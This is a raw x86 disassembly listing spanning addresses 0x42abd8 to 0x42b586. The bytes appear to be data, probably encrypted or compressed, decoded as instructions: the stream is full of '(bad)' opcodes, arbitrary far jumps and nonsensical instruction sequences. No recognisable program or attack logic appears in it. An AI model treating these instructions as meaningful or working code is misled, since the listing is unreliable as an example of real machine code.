  42abd8:	sub    al,0x5d
  42abda:	cmp    al,0x7f
  42abdc:	jg     0x42ac4d
  42abde:	and    BYTE PTR [eax],cl
  42abe0:	mov    dl,0x43
  42abe2:	loop   0x42abb1
  42abe4:	scas   eax,DWORD PTR es:[edi]
  42abe5:	inc    esp
  42abe6:	je     0x42abb1
  42abe8:	add    DWORD PTR [eax],eax
  42abea:	inc    DWORD PTR [eax]
  42abec:	add    BYTE PTR [eax],al
  42abee:	fisttp DWORD PTR [esi+0x7bca4a47]
  42abf4:	lds    eax,FWORD PTR ds:0x15015cea
  42abfa:	mov    dh,0x54
  42abfc:	retf   
  42abfd:	fdiv   st(3),st
  42abff:	add    dl,BYTE PTR [eax]
  42ac01:	xlat   BYTE PTR ds:[ebx]
  42ac02:	pop    ebp
  42ac03:	adc    DWORD PTR ds:0x211e353c,esi
  42ac09:	lock xchg edi,eax
  42ac0b:	sub    esp,esp
  42ac0d:	push   eax
  42ac0e:	loop   0x42abf4
  42ac10:	inc    esp
  42ac11:	lds    esi,FWORD PTR [eax]
  42ac13:	push   es
  42ac14:	scas   al,BYTE PTR es:[edi]
  42ac15:	ret    
  42ac16:	cmc    
  42ac17:	ins    DWORD PTR es:[edi],dx
  42ac18:	(bad)  
  42ac19:	seto   BYTE PTR gs:[ebp+0x6b]
  42ac1e:	int    0x41
  42ac20:	jp     0x42ac2c
  42ac22:	dec    eax
  42ac23:	out    dx,al
  42ac24:	pop    ss
  42ac25:	xor    DWORD PTR [ecx-0x9],esp
  42ac28:	push   eax
  42ac29:	retf   
  42ac2a:	stc    
  42ac2b:	inc    edi
  42ac2c:	ror    BYTE PTR [edx],1
  42ac2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ac2f:	lock das 
  42ac31:	xchg   esi,eax
  42ac32:	cwde   
  42ac33:	jp     0x42abc2
  42ac35:	pop    esp
  42ac36:	aam    0x14
  42ac38:	aam    0xad
  42ac3a:	jl     0x42acb6
  42ac3c:	lock pop esp
  42ac3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ac3f:	adc    eax,0xb48ea0cd
  42ac44:	ror    BYTE PTR cs:[ecx+esi*8+0x55],cl
  42ac49:	call   0xef8a:0x9567ecc8
  42ac50:	ins    BYTE PTR es:[edi],dx
  42ac51:	pop    eax
  42ac52:	or     al,0x96
  42ac54:	dec    esi
  42ac55:	pop    ds
  42ac56:	jle    0x42ac3d
  42ac58:	mov    ebp,0xb8a95123
  42ac5d:	or     BYTE PTR [ebx],bh
  42ac5f:	sar    DWORD PTR [ebx+0x78],0xe5
  42ac63:	cmp    al,BYTE PTR [ebx-0x60733369]
  42ac69:	stos   DWORD PTR es:[edi],eax
  42ac6a:	push   ebx
  42ac6b:	sub    bh,BYTE PTR [eax+eiz*4+0x4c]
  42ac6f:	and    ah,BYTE PTR [ebp+0x1ed9b2cb]
  42ac75:	jbe    0x42ac4d
  42ac77:	push   edx
  42ac78:	jno    0x42ac84
  42ac7a:	pop    edi
  42ac7b:	or     eax,0xa6aec863
  42ac80:	int3   
  42ac81:	sub    dl,cl
  42ac83:	mov    eax,ds:0xb95fb03d
  42ac88:	mov    ebp,0x6a889051
  42ac8d:	gs inc ebx
  42ac8f:	xchg   edx,eax
  42ac90:	scas   al,BYTE PTR es:[edi]
  42ac91:	sub    ch,BYTE PTR [eax+eiz*4]
  42ac94:	xchg   esi,eax
  42ac95:	clc    
  42ac96:	fucomp st(1)
  42ac98:	mov    esp,0xe1f2f57c
  42ac9d:	enter  0xb50d,0x90
  42aca1:	mov    ds:0x1cf27463,eax
  42aca6:	retf   0xa4bb
  42aca9:	ret    
  42acaa:	lds    ebp,FWORD PTR [edi-0x402b87c1]
  42acb0:	dec    esp
  42acb1:	cli    
  42acb2:	aam    0xef
  42acb4:	mov    eax,0x5f64808
  42acb9:	mov    ecx,0x2ac2a349
  42acbe:	pop    es
  42acbf:	add    DWORD PTR [ecx],ecx
  42acc1:	pop    esi
  42acc2:	cmp    al,0x14
  42acc4:	(bad)  [edx]
  42acc6:	cli    
  42acc7:	mov    dl,0x43
  42acc9:	xchg   esi,eax
  42acca:	outs   dx,DWORD PTR ds:[esi]
  42accb:	adc    esp,DWORD PTR [edx-0x64]
  42acce:	xor    DWORD PTR [esi-0x3d696d60],eax
  42acd4:	loope  0x42ac9d
  42acd6:	cmp    DWORD PTR [ebx],esp
  42acd8:	dec    ebp
  42acd9:	or     eax,0x70909ab3
  42acde:	xor    al,0xf6
  42ace0:	cmp    BYTE PTR [ebp+0x3609aeb5],ch
  42ace6:	aas    
  42ace7:	dec    edi
  42ace8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ace9:	bnd ret 
  42aceb:	push   ecx
  42acec:	lahf   
	...
  42ad55:	add    cl,ch
  42ad57:	xor    bl,BYTE PTR [edx+edi*1]
  42ad5a:	fistp  QWORD PTR [esi]
  42ad5c:	out    dx,eax
  42ad5d:	repz ret 
  42ad5f:	fcom   DWORD PTR [edx+0x72]
  42ad62:	cmp    ch,BYTE PTR [edi+0x50]
  42ad65:	xlat   BYTE PTR ds:[ebx]
  42ad66:	jae    0x42ad32
  42ad68:	add    DWORD PTR [eax],eax
  42ad6a:	inc    DWORD PTR [eax]
  42ad6c:	add    BYTE PTR [eax],al
  42ad6e:	xchg   al,dh
  42ad70:	add    al,0xc7
  42ad72:	in     al,dx
  42ad73:	adc    BYTE PTR [ecx-0x3b],ch
  42ad76:	ins    BYTE PTR es:[edi],dx
  42ad77:	jp     0x42ad0c
  42ad79:	sub    ebx,ecx
  42ad7b:	xor    eax,0x7f7b4584
  42ad80:	xchg   ebp,eax
  42ad81:	aas    
  42ad82:	call   0xbe75:0xe88b9a26
  42ad89:	dec    DWORD PTR [esi-0x3b]
  42ad8c:	sbb    al,0x74
  42ad8e:	and    DWORD PTR [eax+ebx*4-0x6c],eax
  42ad92:	add    edx,DWORD PTR [ebp+0x0]
  42ad95:	div    BYTE PTR cs:[esi+0x7d21d0dd]
  42ad9c:	sub    ch,BYTE PTR [ebp+0x28]
  42ad9f:	jnp    0x42ae16
  42ada1:	cmp    dl,BYTE PTR [edx]
  42ada3:	xchg   ebp,eax
  42ada4:	(bad)  
  42ada5:	out    dx,eax
  42ada6:	cwde   
  42ada7:	inc    edi
  42ada8:	fistp  QWORD PTR [ecx]
  42adaa:	xor    BYTE PTR [esp+edi*1],0xff
  42adae:	xchg   ebp,eax
  42adaf:	adc    bl,cl
  42adb1:	aam    0x80
  42adb3:	and    al,cl
  42adb5:	sahf   
  42adb6:	cmp    al,0x4e
  42adb8:	in     eax,0xe8
  42adba:	popf   
  42adbb:	inc    eax
  42adbc:	js     0x42ad69
  42adbe:	mov    ebx,0x3313a35b
  42adc3:	xchg   DWORD PTR [bx+di],eax
  42adc6:	or     eax,DWORD PTR [edx-0x21]
  42adc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42adca:	js     0x42ad92
  42adcc:	lds    esp,FWORD PTR ds:0xcfe9ec8
  42add2:	stos   DWORD PTR es:[edi],eax
  42add3:	mov    cl,0x98
  42add5:	gs imul ecx,esi,0x5b
  42add9:	xor    eax,ebx
  42addb:	sbb    al,BYTE PTR [edx]
  42addd:	sbb    ebx,DWORD PTR [ebp+0x12b49245]
  42ade3:	outs   dx,BYTE PTR ds:[esi]
  42ade4:	inc    eax
  42ade5:	cmp    eax,0x42075a70
  42adea:	cmovae ebp,DWORD PTR [eax+ebp*8]
  42adee:	ret    
  42adef:	test   bl,bh
  42adf1:	lea    ecx,[ebx]
  42adf3:	xchg   esi,eax
  42adf4:	fidiv  DWORD PTR [ebx+0x3ed1466b]
  42adfa:	sub    eax,0xc90ad557
  42adff:	lea    edi,[edi+0x127adc7e]
  42ae05:	xor    BYTE PTR [edi-0x17],dl
  42ae08:	lea    ebx,[ebx]
  42ae0a:	(bad)  
  42ae0b:	aad    0xdc
  42ae0d:	lods   eax,DWORD PTR ds:[esi]
  42ae0e:	imul   esi,DWORD PTR [edi+0x65],0xd57c92dd
  42ae15:	mov    eax,DWORD PTR [ebx]
  42ae17:	iret   
  42ae18:	mov    ah,0x98
  42ae1a:	(bad)  
  42ae1b:	lods   al,BYTE PTR ds:[esi]
  42ae1c:	xor    ah,BYTE PTR [esp+esi*2-0x5d]
  42ae20:	cmp    DWORD PTR [edx-0x17095bd5],esp
  42ae26:	test   BYTE PTR ds:0x35bf1087,cl
  42ae2c:	cmc    
  42ae2d:	adc    DWORD PTR [ecx],ebx
  42ae2f:	inc    edx
  42ae30:	adc    ebp,0xbcbc38ef
  42ae36:	dec    ecx
  42ae37:	imul   DWORD PTR [ecx-0x21]
  42ae3a:	inc    esi
  42ae3b:	pop    esi
  42ae3c:	aaa    
  42ae3d:	pop    esp
  42ae3e:	mov    dl,0x55
  42ae40:	sbb    DWORD PTR [esi+0xf],esi
  42ae43:	(bad)  [ebx+0x5f]
  42ae46:	mov    edx,0x94d065ce
  42ae4b:	(bad)  
  42ae4c:	fcomp  QWORD PTR fs:[eax+0x75]
  42ae50:	and    al,0x28
  42ae52:	pop    edi
  42ae53:	cdq    
  42ae54:	cdq    
  42ae55:	hlt    
  42ae56:	cmp    ecx,edi
  42ae58:	push   cs
  42ae59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ae5a:	adc    esi,DWORD PTR [ecx+0x3a54c6ae]
  42ae60:	xchg   esp,eax
  42ae61:	mov    ch,0x31
  42ae63:	or     ch,BYTE PTR [ecx-0x8b3ea85]
  42ae69:	xor    DWORD PTR [ecx+0xf26e],ebx
	...
  42aed3:	add    BYTE PTR [eax],al
  42aed5:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42aedb:	mov    edi,0x7bd8f7ff
  42aee0:	mov    dh,0xb9
  42aee2:	push   0x727040f9
  42aee7:	retf   
  42aee8:	add    DWORD PTR [eax],eax
  42aeea:	inc    DWORD PTR [eax]
  42aeec:	add    BYTE PTR [eax],al
  42aeee:	mov    bl,0xf8
  42aef0:	jae    0x42af2b
  42aef2:	jl     0x42af35
  42aef4:	ret    
  42aef5:	dec    edx
  42aef6:	into   
  42aef7:	aas    
  42aef8:	sub    ecx,ecx
  42aefa:	jns    0x42aeee
  42aefc:	sub    dl,bl
  42aefe:	je     0x42aea7
  42af00:	out    dx,al
  42af01:	jnp    0x42af7c
  42af03:	inc    ecx
  42af04:	inc    eax
  42af05:	add    ebx,DWORD PTR [esi+0x2f7202d9]
  42af0b:	outs   dx,BYTE PTR ds:[esi]
  42af0c:	inc    esp
  42af0d:	mov    dh,0x5e
  42af0f:	xchg   ebx,eax
  42af10:	xor    al,0x49
  42af12:	and    al,0x15
  42af14:	rol    ecx,cl
  42af16:	sub    al,0x64
  42af18:	pop    esp
  42af19:	in     al,dx
  42af1a:	mov    WORD PTR [ecx-0x56],?
  42af1d:	neg    BYTE PTR [ebp-0x51]
  42af20:	sub    bl,BYTE PTR [ecx-0x30832dee]
  42af26:	adc    ebx,DWORD PTR [ebx-0x6c2654ae]
  42af2c:	pop    DWORD PTR [ebx-0x18]
  42af2f:	lds    esp,FWORD PTR [eax-0x11e3bfb3]
  42af35:	leave  
  42af36:	xchg   ebp,eax
  42af37:	push   ebx
  42af38:	jle    0x42aef9
  42af3a:	and    eax,0xb9b35e23
  42af3f:	push   0x22
  42af41:	in     eax,dx
  42af42:	inc    ebp
  42af43:	lahf   
  42af44:	outs   dx,DWORD PTR ds:[esi]
  42af45:	sbb    al,0x7e
  42af47:	enter  0x7d67,0x49
  42af4b:	mov    ah,BYTE PTR [edi-0x28]
  42af4e:	mov    cl,dl
  42af50:	mov    ah,0x17
  42af52:	pusha  
  42af53:	call   DWORD PTR [esp+eax*1-0x5e]
  42af57:	fcom   QWORD PTR [eax-0x78]
  42af5a:	aas    
  42af5b:	call   0xe7143caf
  42af60:	ss mov ecx,ds
  42af63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af64:	js     0x42afd5
  42af66:	popf   
  42af67:	mov    DWORD PTR [edx+0x7a37d75e],ebp
  42af6d:	jmp    0x481d1813
  42af72:	pop    ss
  42af73:	test   eax,0xcef54722
  42af78:	popf   
  42af79:	and    DWORD PTR [eax],edx
  42af7b:	popa   
  42af7c:	xor    esi,DWORD PTR [eax-0x499ba039]
  42af82:	inc    ecx
  42af83:	(bad)  
  42af85:	es popa 
  42af87:	leave  
  42af88:	fdiv   DWORD PTR [esp+ebp*4]
  42af8b:	xor    DWORD PTR [esi],ebx
  42af8d:	sub    eax,0x7dd2735
  42af92:	push   es
  42af93:	in     eax,0xb9
  42af95:	xchg   esi,eax
  42af96:	sahf   
  42af97:	jge    0x42af3a
  42af99:	aaa    
  42af9a:	lods   al,BYTE PTR ds:[esi]
  42af9b:	sbb    BYTE PTR [ebp+0x1b4a598d],al
  42afa1:	dec    ecx
  42afa2:	inc    esp
  42afa3:	mov    ds:0x55ea4a30,al
  42afa8:	pop    ds
  42afa9:	loop   0x42af4e
  42afab:	and    bh,cl
  42afad:	cld    
  42afae:	mov    bl,0xd4
  42afb0:	dec    ebp
  42afb1:	cmp    bl,BYTE PTR ds:0xb1232bac
  42afb7:	mov    dl,0xed
  42afb9:	inc    esi
  42afba:	call   0x6c01:0x3bc664dd
  42afc1:	nop
  42afc2:	fistp  QWORD PTR [edx-0x4f6faf20]
  42afc8:	ficomp DWORD PTR [ebp+0x33]
  42afcb:	loop   0x42aff2
  42afcd:	mov    ds:0x9e42c68e,eax
  42afd2:	ficomp WORD PTR [esi-0x36]
  42afd5:	(bad)  
  42afd6:	repnz ror esp,1
  42afd9:	cmp    esp,DWORD PTR [eax-0x6bb309f2]
  42afdf:	mov    BYTE PTR [ebx+esi*4+0x41],dh
  42afe3:	push   es
  42afe4:	adc    DWORD PTR [edx+edx*1-0x4c],eax
  42afe8:	cmp    eax,0x1d51cf3a
	...
  42b055:	add    cl,bh
  42b057:	enter  0xdc7a,0x7b
  42b05b:	(bad)  
  42b05c:	(bad)  
  42b05d:	in     eax,dx
  42b05e:	sbb    al,0x4f
  42b060:	push   ebp
  42b061:	inc    esp
  42b062:	dec    edx
  42b063:	xchg   ecx,eax
  42b064:	or     al,0x9f
  42b066:	jno    0x42b034
  42b068:	add    DWORD PTR [eax],eax
  42b06a:	inc    DWORD PTR [eax]
  42b06c:	add    BYTE PTR [eax],al
  42b06e:	inc    edi
  42b06f:	xchg   ecx,eax
  42b070:	fstp   QWORD PTR [ebx-0x29]
  42b073:	jb     0x42b0ae
  42b075:	add    al,0x44
  42b077:	stos   DWORD PTR es:[edi],eax
  42b078:	xchg   ebx,eax
  42b079:	jmp    0x492c:0x95516af1
  42b080:	int3   
  42b081:	mov    cl,0x9
  42b083:	inc    edi
  42b084:	cmp    cl,BYTE PTR [edx]
  42b086:	std    
  42b087:	(bad)  [esi+0x1]
  42b08a:	test   eax,0x61ce92b8
  42b08f:	ins    BYTE PTR es:[edi],dx
  42b090:	sub    al,0x69
  42b092:	stc    
  42b093:	stos   DWORD PTR es:[edi],eax
  42b094:	std    
  42b095:	adc    BYTE PTR ds:0x81c27555,0xfb
  42b09c:	push   esi
  42b09d:	mov    bl,0xcf
  42b09f:	repz mov al,0x76
  42b0a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b0a3:	mov    ecx,0xae0a844b
  42b0a8:	sbb    eax,0x8de78366
  42b0ad:	test   al,0x7f
  42b0af:	popf   
  42b0b0:	test   esp,esi
  42b0b2:	sub    cl,BYTE PTR [ecx-0x64]
  42b0b5:	sbb    BYTE PTR [esi+edx*4],dl
  42b0b8:	je     0x42b03c
  42b0ba:	mov    ebx,0xe373622d
  42b0bf:	in     al,0x25
  42b0c1:	jmp    0x22b4:0xc57b4c3f
  42b0c8:	xor    al,0xb9
  42b0ca:	lea    ecx,[esi+0xf33e312]
  42b0d0:	xor    eax,0xe032d274
  42b0d5:	mov    edx,0xb18d9d5a
  42b0da:	jb     0x42b091
  42b0dc:	mov    al,ds:0xaad3766f
  42b0e1:	sub    al,0x6a
  42b0e3:	xchg   ebx,ebx
  42b0e5:	add    DWORD PTR [ecx+0x7127373a],ecx
  42b0eb:	dec    ecx
  42b0ec:	jnp    0x42b168
  42b0ee:	pusha  
  42b0ef:	mov    esp,0xac29de2e
  42b0f4:	add    eax,0x3944fc9d
  42b0f9:	js     0x42b149
  42b0fb:	mov    es,ebp
  42b0fd:	xor    ch,bl
  42b0ff:	fld    QWORD PTR [edi-0x71819a2a]
  42b105:	mov    dh,0xbe
  42b107:	mov    edx,0x86c405ac
  42b10c:	enter  0xab3d,0x74
  42b110:	pop    edi
  42b111:	stos   DWORD PTR es:[edi],eax
  42b112:	scas   eax,DWORD PTR es:[edi]
  42b113:	clc    
  42b114:	push   edi
  42b115:	xchg   ebx,eax
  42b116:	or     eax,0xbf5ff58
  42b11b:	xor    DWORD PTR [esi-0x1e763be9],esi
  42b121:	fdivr  QWORD PTR [ecx]
  42b123:	xor    BYTE PTR [esi],0xef
  42b126:	retf   
  42b127:	cmp    al,BYTE PTR [ebx-0x8]
  42b12a:	jmp    0xd841679d
  42b12f:	adc    BYTE PTR [ecx],dh
  42b131:	addr16 aam 0x19
  42b134:	cmp    al,0x9c
  42b136:	or     ah,bl
  42b138:	shl    DWORD PTR [ecx-0x1d5f4dfc],1
  42b13e:	inc    esp
  42b13f:	inc    eax
  42b140:	mov    ds:0xe029dee7,al
  42b145:	or     BYTE PTR [edx+0x3f],0xb7
  42b149:	cmp    cl,BYTE PTR [esp+edi*2]
  42b14c:	mov    bl,0xb9
  42b14e:	adc    esi,0x11
  42b151:	push   ss
  42b152:	js     0x42b1a7
  42b154:	outs   dx,DWORD PTR ds:[esi]
  42b155:	push   cs
  42b156:	mov    ?,edi
  42b158:	hlt    
  42b159:	jne    0x42b17a
  42b15b:	inc    ecx
  42b15c:	sahf   
  42b15d:	cs jmp 0x3e06dc12
  42b163:	and    BYTE PTR [ebp-0x3f2ff242],dl
  42b169:	scas   al,BYTE PTR es:[edi]
  42b16a:	jecxz  0x42b1b3
  42b16c:	dec    edx
	...
  42b1d5:	add    BYTE PTR [ebp+0x25],dh
  42b1d8:	imul   ebx,DWORD PTR [edi-0x51]
  42b1dc:	cmc    
  42b1dd:	call   eax
  42b1df:	inc    ebx
  42b1e0:	push   edi
  42b1e1:	popa   
  42b1e2:	xlat   BYTE PTR ds:[ebx]
  42b1e3:	mov    esi,0xcd70311d
  42b1e8:	add    DWORD PTR [eax],eax
  42b1ea:	inc    DWORD PTR [eax]
  42b1ec:	add    BYTE PTR [eax],al
  42b1ee:	in     al,0x17
  42b1f0:	cmp    DWORD PTR [ecx-0x21],esp
  42b1f3:	stos   BYTE PTR es:[edi],al
  42b1f4:	es aam 0xcb
  42b1f7:	or     al,0x1d
  42b1f9:	out    0x97,al
  42b1fb:	(bad)  
  42b1fc:	arpl   WORD PTR [eax-0x67],bp
  42b1ff:	push   edi
  42b200:	mov    esi,0x54ddcbbd
  42b205:	dec    esi
  42b206:	sbb    esp,esi
  42b208:	add    DWORD PTR [ebx+0x13],0x4387bd12
  42b20f:	mov    al,0x77
  42b211:	outs   dx,DWORD PTR ds:[esi]
  42b212:	out    dx,al
  42b213:	std    
  42b214:	pop    ds
  42b215:	inc    esp
  42b216:	fdiv   DWORD PTR [ecx]
  42b218:	adc    eax,0xc2cc0034
  42b21d:	push   edx
  42b21e:	push   esi
  42b21f:	test   DWORD PTR [ecx+0x48],0x573d0c8
  42b226:	add    al,BYTE PTR [ecx+0x3a61d68c]
  42b22c:	aam    0xf
  42b22e:	lods   eax,DWORD PTR ds:[esi]
  42b22f:	cmp    eax,DWORD PTR [ecx-0x4f]
  42b232:	push   eax
  42b233:	fiadd  WORD PTR [ecx-0x4c348891]
  42b239:	push   esp
  42b23a:	sub    BYTE PTR [eax+0x41],0xd7
  42b23e:	mov    ch,0x78
  42b240:	loopne 0x42b25c
  42b242:	jg     0x42b238
  42b244:	cld    
  42b245:	push   edx
  42b246:	xor    al,0xd
  42b248:	xor    esi,ebx
  42b24a:	and    cl,BYTE PTR [edx+0x2a8b9112]
  42b250:	xchg   edx,eax
  42b251:	mov    ecx,0x52096d49
  42b256:	fsubr  st(6),st
  42b258:	stos   DWORD PTR es:[edi],eax
  42b259:	pop    ss
  42b25a:	pop    ebx
  42b25b:	inc    edx
  42b25c:	ins    DWORD PTR es:[edi],dx
  42b25d:	ss dec esi
  42b25f:	addr16 cmp al,0x47
  42b262:	cmp    ch,bh
  42b264:	xchg   ebx,eax
  42b265:	xor    ebx,esp
  42b267:	adc    ebx,DWORD PTR [edx-0x365724b9]
  42b26d:	add    DWORD PTR [edx-0x44],esp
  42b270:	cmp    al,0x77
  42b272:	push   ebx
  42b273:	test   eax,0x2fbb18fb
  42b278:	leave  
  42b279:	sub    DWORD PTR [ebp+edx*2-0x2b],edx
  42b27d:	or     ebx,DWORD PTR [ecx-0x38]
  42b280:	fild   DWORD PTR [esi-0x116f1a05]
  42b286:	pop    edi
  42b287:	stc    
  42b288:	adc    eax,0x28d548e4
  42b28d:	mov    ds:0xce18aced,eax
  42b292:	add    BYTE PTR ds:0xe146988,cl
  42b298:	aad    0xff
  42b29a:	test   eax,0xcb2baa12
  42b29f:	in     al,dx
  42b2a0:	dec    ebp
  42b2a1:	out    dx,al
  42b2a2:	je     0x42b25a
  42b2a4:	adc    bl,dl
  42b2a6:	lea    esp,[eax]
  42b2a8:	ds mov cl,0x6e
  42b2ab:	jle    0x42b24d
  42b2ad:	cmp    DWORD PTR [edi],ebp
  42b2af:	pop    ebp
  42b2b0:	mov    WORD PTR [ebp+0x76],?
  42b2b3:	xchg   ecx,eax
  42b2b4:	mul    BYTE PTR [ebx+0x4e]
  42b2b7:	out    dx,eax
  42b2b8:	inc    edi
  42b2b9:	imul   ebp,ebx,0x1969ea36
  42b2bf:	out    0xc3,eax
  42b2c1:	mov    BYTE PTR [edx-0x3f9c7a65],0x94
  42b2c8:	adc    al,0xd5
  42b2ca:	sbb    ecx,esp
  42b2cc:	xor    eax,0x1dd637b1
  42b2d1:	mov    WORD PTR [edi+0x32be047e],ds
  42b2d7:	in     al,0x31
  42b2d9:	mov    bh,0x9
  42b2db:	push   ss
  42b2dc:	fs dec edi
  42b2de:	sar    eax,0x4d
  42b2e1:	ret    0xd054
  42b2e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2e5:	inc    ebp
  42b2e6:	rol    BYTE PTR [edi-0x77],1
  42b2e9:	inc    esi
  42b2ea:	stc    
  42b2eb:	shl    DWORD PTR [esi],0x0
	...
  42b356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b357:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b35d:	iret   
  42b35e:	sub    eax,0xd5738e65
  42b363:	cmp    al,dl
  42b365:	cmp    ebp,DWORD PTR [edi-0x32]
  42b368:	add    DWORD PTR [eax],eax
  42b36a:	inc    DWORD PTR [eax]
  42b36c:	add    BYTE PTR [eax],al
  42b36e:	mov    ch,0x25
  42b370:	dec    edi
  42b371:	fild   WORD PTR [ecx+0x78]
  42b374:	xchg   cl,bl
  42b376:	loope  0x42b35b
  42b378:	popf   
  42b379:	stos   BYTE PTR es:[edi],al
  42b37a:	rcr    BYTE PTR [ecx+edi*8-0x248a017b],1
  42b381:	stos   BYTE PTR es:[edi],al
  42b382:	fidivr DWORD PTR [ebx-0x36]
  42b385:	or     DWORD PTR gs:[eax],edi
  42b388:	pop    esp
  42b389:	mov    ecx,0xc2654b7a
  42b38e:	pop    ebx
  42b38f:	inc    esp
  42b390:	push   ds
  42b391:	inc    eax
  42b392:	push   esp
  42b393:	in     al,0xf0
  42b395:	(bad)  
  42b396:	dec    ebp
  42b397:	call   0x658db69a
  42b39c:	(bad)  
  42b39d:	not    DWORD PTR [ecx-0x6b7fac50]
  42b3a3:	jmp    0xa8c9:0x7ed3dc73
  42b3aa:	inc    BYTE PTR [ecx+0x164e90f1]
  42b3b0:	add    al,0x20
  42b3b2:	push   esp
  42b3b3:	nop
  42b3b4:	ret    
  42b3b5:	ret    0xc5a0
  42b3b8:	push   ds
  42b3b9:	push   ebx
  42b3ba:	loop   0x42b3bb
  42b3bc:	mov    BYTE PTR [ecx],bh
  42b3be:	aaa    
  42b3bf:	jl     0x42b383
  42b3c1:	cmp    esi,DWORD PTR [esi-0x2b45cbd2]
  42b3c7:	ror    DWORD PTR [edx-0x2d17df77],0x18
  42b3ce:	fidiv  WORD PTR [ebx]
  42b3d0:	jmp    0x1464a5c
  42b3d5:	push   0xffffffee
  42b3d7:	lods   al,BYTE PTR ds:[esi]
  42b3d8:	lahf   
  42b3d9:	cmp    dl,dh
  42b3db:	ja     0x42b37a
  42b3dd:	imul   esp,DWORD PTR [ebx+0xa947a0c],0x4c
  42b3e4:	mov    ecx,0xb3e7d71b
  42b3e9:	sbb    DWORD PTR [esi+0x33],esi
  42b3ec:	ror    DWORD PTR [ebx-0x7845e5d4],cl
  42b3f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b3f3:	cmp    esi,ebp
  42b3f5:	call   0xf0e3:0xe4128d91
  42b3fc:	cdq    
  42b3fd:	mov    ch,0x0
  42b3ff:	scas   eax,DWORD PTR es:[edi]
  42b400:	mov    edi,0x6ca83d72
  42b405:	lods   eax,DWORD PTR ds:[esi]
  42b406:	dec    ecx
  42b407:	add    DWORD PTR [ebp+0x64],eax
  42b40a:	or     DWORD PTR [edx-0x16],eax
  42b40d:	push   esp
  42b40e:	into   
  42b40f:	jno    0x42b48c
  42b411:	lahf   
  42b412:	and    ebp,0x65
  42b415:	fcomp  st(0)
  42b417:	inc    edx
  42b418:	mov    ds:0x6851f727,eax
  42b41d:	cmc    
  42b41e:	(bad)  
  42b41f:	repz inc ebp
  42b421:	lods   al,BYTE PTR ds:[esi]
  42b422:	repz mov ah,0x1e
  42b425:	inc    esi
  42b426:	in     al,dx
  42b427:	iret   
  42b428:	xchg   ebp,eax
  42b429:	imul   BYTE PTR [eax-0x3c]
  42b42c:	repz aam 0xf8
  42b42f:	js     0x42b40c
  42b431:	ins    DWORD PTR es:[edi],dx
  42b432:	retf   0x79da
  42b435:	xchg   edi,eax
  42b436:	mov    ds:0x19c06dfe,al
  42b43b:	ss push edi
  42b43d:	push   edx
  42b43e:	push   ebp
  42b43f:	rcr    ebp,cl
  42b441:	xor    al,0x2d
  42b443:	loope  0x42b3f2
  42b445:	or     ah,al
  42b447:	mov    ebx,0x5edb57db
  42b44c:	sub    eax,0x3ef0c65d
  42b451:	mov    dh,0xc6
  42b453:	popa   
  42b454:	jno    0x42b3ed
  42b456:	push   es
  42b457:	ds jl  0x42b3ec
  42b45a:	dec    eax
  42b45b:	push   edx
  42b45c:	iret   
  42b45d:	ja     0x42b40e
  42b45f:	(bad)  
  42b460:	inc    esi
  42b461:	mov    al,0x76
  42b463:	xor    al,0x88
  42b465:	pop    ds
  42b466:	out    dx,eax
  42b467:	jbe    0x42b432
  42b469:	adc    edi,DWORD PTR [esi]
  42b46b:	ror    DWORD PTR ds:0x0,1
	...
  42b4d5:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b4db:	out    dx,eax
  42b4dc:	into   
  42b4dd:	gs jo  0x42b4b0
  42b4e0:	cld    
  42b4e1:	test   DWORD PTR [edi+0x6ed77e17],edi
  42b4e7:	iret   
  42b4e8:	add    DWORD PTR [eax],eax
  42b4ea:	inc    DWORD PTR [eax]
  42b4ec:	add    BYTE PTR [eax],al
  42b4ee:	jbe    0x42b47d
  42b4f0:	dec    edi
  42b4f1:	mov    ds:0x7397dc27,eax
  42b4f6:	cs clc 
  42b4f8:	gs enter 0xa096,0x39
  42b4fd:	adc    ch,BYTE PTR [eax-0x50]
  42b500:	aad    0xc
  42b502:	fs pop ss
  42b504:	stos   BYTE PTR es:[edi],al
  42b505:	clc    
  42b506:	pop    edx
  42b507:	test   al,0xa7
  42b509:	xor    al,0x4f
  42b50b:	rcr    edx,cl
  42b50d:	fisub  WORD PTR [ebp+ecx*8+0x5f119046]
  42b514:	jb     0x42b52d
  42b516:	es ja  0x42b58b
  42b519:	hlt    
  42b51a:	ret    0xe624
  42b51d:	cmp    esp,0x2e
  42b520:	mov    ecx,0xcec8ad4b
  42b525:	push   edi
  42b526:	mov    cl,0xc6
  42b528:	or     eax,0x38e49848
  42b52d:	push   ebx
  42b52e:	xchg   esi,eax
  42b52f:	(bad)  
  42b530:	and    dh,BYTE PTR [ecx+0x6e]
  42b533:	adc    bh,BYTE PTR [esi+ebp*4+0x3e89b26f]
  42b53a:	cli    
  42b53b:	cmp    dl,dl
  42b53d:	dec    esp
  42b53e:	jecxz  0x42b518
  42b540:	mov    bh,0xc
  42b542:	or     eax,0x4315f649
  42b547:	aaa    
  42b548:	jno    0x42b5ad
  42b54a:	cdq    
  42b54b:	cld    
  42b54c:	stc    
  42b54d:	outs   dx,BYTE PTR ds:[esi]
  42b54e:	nop
  42b54f:	mov    eax,0x156bf873
  42b554:	cmp    edi,edi
  42b556:	push   ebp
  42b557:	xchg   esi,eax
  42b558:	push   esp
  42b559:	or     eax,0x6fbc2dfd
  42b55e:	(bad)  
  42b55f:	xor    eax,DWORD PTR [esi+0x5ab8061a]
  42b565:	dec    ebx
  42b566:	cmp    eax,ebx
  42b568:	mov    gs,WORD PTR ds:0xcabd9597
  42b56e:	jle    0x42b559
  42b570:	out    dx,eax
  42b571:	xor    eax,0x4c97c162
  42b576:	xor    DWORD PTR [ecx+0x3c6cd49f],edi
  42b57c:	leave  
  42b57d:	xor    dh,BYTE PTR [eax+0x69]
  42b580:	sub    DWORD PTR ds:0x12493464,esi
  42b586:	mov    edx,0x8245e38
